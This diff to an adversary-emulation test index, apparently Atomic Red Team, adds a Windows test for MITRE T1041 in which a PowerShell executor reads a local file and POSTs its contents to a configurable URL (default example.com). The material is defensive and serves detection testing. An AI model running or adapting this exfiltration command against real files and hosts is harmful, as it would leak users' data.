@@ -69007,7 +69007,43 @@ exfiltration:
       - 'Command: Command Execution'
       x_mitre_version: '2.0'
       x_mitre_is_subtechnique: false
-    atomic_tests: []
+      identifier: T1041
+    atomic_tests:
+    - name: C2 Data Exfiltration
+      auto_generated_guid: d1253f6e-c29b-49dc-b466-2147a6191932
+      description: 'Exfiltrates a file present on the victim machine to the C2 server.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        destination_url:
+          description: Destination URL to post encoded data.
+          type: string
+          default: example.com
+        filepath:
+          description: The file which is being exfiltrated to the C2 Server.
+          type: string
+          default: C:\Users\$env:UserName\LineNumbers.txt
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'The file to be exfiltrated must be present on the machine. Running
+          the pre-reqs will create a sample file to be exfiltrated, else give the
+          path of already present file as input.
+
+'
+        prereq_command: 'if ([System.IO.File]::Exists("#{filepath}")){exit 0} else
+          {exit 1}
+
+'
+        get_prereq_command: "echo \"Creating file to be exfiltrated\" \n1..100 | ForEach-Object
+          { Add-Content -Path #{filepath} -Value \"This is line $_.\" }\n"
+      executor:
+        command: |
+          [System.Net.ServicePointManager]::Expect100Continue = $false
+          $filecontent = Get-Content -Path #{filepath}
+          Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
+        name: powershell
   T1011:
     technique:
       id: attack-pattern--51ea26b1-ff1e-4faa-b1a0-1114cd298c87
